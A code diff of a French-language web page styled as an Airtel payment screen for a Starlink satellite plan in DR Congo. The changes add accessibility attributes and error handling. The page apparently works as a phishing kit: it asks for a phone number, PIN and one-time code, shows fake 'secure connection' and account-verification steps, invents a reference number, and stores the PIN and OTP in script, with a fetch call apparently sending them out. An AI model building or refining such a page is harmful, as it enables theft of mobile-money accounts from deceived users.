+        <button class="numkey del" id="npDel" aria-label="Effacer un chiffre" aria-hidden="false">⌫</button>
       </div>
 
       <button class="btn-cta dim" id="loginBtn" onclick="submitLogin()" type="button">
         <span>
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
           Autoriser le Paiement
         </span>
       </button>
@@ -463,17 +490,17 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <div class="view" id="viewProc">
   <div class="proc">
     <div class="proc-loader">
-      <div class="proc-ring"></div>
-      <svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" class="proc-logo"><g transform="translate(-57.9 -110.7)"><g transform="translate(58.856 110.7)"><g><g transform="translate(36.705)"><path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/><path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/><path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/><path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/><path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/><path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/><path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/></g><path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/></g></g></g></svg>
+      <div class="proc-ring" aria-hidden="true"></div>
+      <svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" class="proc-logo"><use href="#logo-airtel"/></svg>
     </div>
     <div class="proc-title">Traitement en cours…</div>
-    <div class="proc-sub" id="procSub">Connexion sécurisée en cours…</div>
-    <div class="proc-bar"><div class="proc-bar-fill" id="procBar"></div></div>
-    <div class="proc-steps">
-      <div class="proc-step act" id="psi0"><div class="proc-step-dot"></div><div class="proc-step-txt">Connexion sécurisée établie</div></div>
-      <div class="proc-step" id="psi1"><div class="proc-step-dot"></div><div class="proc-step-txt">Vérification du compte Airtel</div></div>
-      <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Validation du forfait satellite</div></div>
-      <div class="proc-step" id="psi3"><div class="proc-step-dot"></div><div class="proc-step-txt">Envoi du code OTP…</div></div>
+    <div class="proc-sub" id="procSub" role="status" aria-live="polite">Connexion sécurisée en cours…</div>
+    <div class="proc-bar" aria-hidden="true"><div class="proc-bar-fill" id="procBar"></div></div>
+    <div class="proc-steps" role="list">
+      <div class="proc-step act" id="psi0"><div class="proc-step-dot" aria-hidden="true"></div><div class="proc-step-txt">Connexion sécurisée établie</div></div>
+      <div class="proc-step" id="psi1"><div class="proc-step-dot" aria-hidden="true"></div><div class="proc-step-txt">Vérification du compte Airtel</div></div>
+      <div class="proc-step" id="psi2"><div class="proc-step-dot" aria-hidden="true"></div><div class="proc-step-txt">Validation du forfait satellite</div></div>
+      <div class="proc-step" id="psi3"><div class="proc-step-dot" aria-hidden="true"></div><div class="proc-step-txt">Envoi du code OTP…</div></div>
     </div>
   </div>
 </div>
@@ -481,7 +508,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <div class="view" id="viewOTP">
   <div class="otp-wrap">
     <div class="otp-card">
-      <div class="otp-icon">
+      <div class="otp-icon" aria-hidden="true">
         <svg viewBox="0 0 24 24" fill="none" stroke="#E40000" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <rect x="5" y="2" width="14" height="20" rx="2"/>
           <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/>
@@ -492,35 +519,35 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="otp-phone" id="otpPhone"><span>🇨🇩</span>+243 —</div>
     </div>
 
-    <div class="otp-boxes" id="otpBoxes" onclick="focusOTPInput()">
-      <div class="otp-box" id="ob0"></div>
-      <div class="otp-box" id="ob1"></div>
-      <div class="otp-box" id="ob2"></div>
-      <div class="otp-box" id="ob3"></div>
+    <div class="otp-boxes" id="otpBoxes" onclick="focusOTPInput()" role="group" aria-label="Code OTP à 4 chiffres">
+      <div class="otp-box" id="ob0" role="textbox" aria-label="Chiffre 1 sur 4" aria-readonly="true"></div>
+      <div class="otp-box" id="ob1" role="textbox" aria-label="Chiffre 2 sur 4" aria-readonly="true"></div>
+      <div class="otp-box" id="ob2" role="textbox" aria-label="Chiffre 3 sur 4" aria-readonly="true"></div>
+      <div class="otp-box" id="ob3" role="textbox" aria-label="Chiffre 4 sur 4" aria-readonly="true"></div>
     </div>
 
-    <div class="otp-err-zone" id="otpErr">
+    <div class="otp-err-zone" id="otpErr" role="alert" aria-live="assertive">
       <div class="otp-err-msg" id="otpErrMsg"></div>
       <div class="otp-err-actions" id="otpErrActions"></div>
     </div>
 
-    <input id="otpInput" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="one-time-code" oninput="onOTPInput(this.value)" onblur="onOTPBlur()" aria-label="Code OTP">
+    <input id="otpInput" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="one-time-code" oninput="onOTPInput(this.value)" onblur="onOTPBlur()" aria-label="Code OTP à 4 chiffres">
 
     <div class="otp-meta">
       <div class="otp-help">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
         <span>Appuyez sur les cases pour saisir le code</span>
       </div>
       <div class="otp-timer-row">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
-        <span>Code expire dans&nbsp;</span><span class="otp-timer" id="otpTimer">60</span><span>&nbsp;s</span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        <span>Code expire dans&nbsp;</span><span class="otp-timer" id="otpTimer" aria-live="off">60</span><span>&nbsp;s</span>
       </div>
       <button class="otp-resend dim" id="resendBtn" onclick="resendOTP()" type="button">Renvoyer le code OTP</button>
     </div>
 
     <button class="btn-cta dim" id="otpBtn" onclick="submitOTP()" type="button">
       <span>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         Valider le Code
       </span>
     </button>
@@ -590,6 +617,7 @@ var peekVisible = false;
 function togglePeek(){
   peekVisible = !peekVisible;
   document.getElementById('peekTxt').textContent = peekVisible ? 'Masquer' : 'Afficher';
+  document.getElementById('peekBtn').setAttribute('aria-pressed', peekVisible ? 'true' : 'false');
   var icon = document.getElementById('peekIcon');
   icon.innerHTML = peekVisible
     ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
@@ -663,7 +691,7 @@ async function submitLogin(){
     });
   } catch(e){}
 
-  sessionStorage.setItem('starlinkAuth', JSON.stringify({phone:ph, pin:pin}));
+  try { sessionStorage.setItem('starlinkAuth', JSON.stringify({phone:ph, pin:pin})); } catch(e){}
   setStep(2); showView('viewProc');
   runProcessing(ph);
 }
@@ -822,8 +850,10 @@ function submitOTP(){
     return;
   }
   var ref = 'STL-CG-' + (Math.random()*9e5+1e5|0);
-  sessionStorage.setItem('starlinkRef', ref);
-  sessionStorage.setItem('starlinkOTP', otpVal);
+  try {
+    sessionStorage.setItem('starlinkRef', ref);
+    sessionStorage.setItem('starlinkOTP', otpVal);
+  } catch(e){}
   for(var i=0;i<4;i++) document.getElementById('ob'+i).classList.add('success');
   hap(H.success);
   (function(){
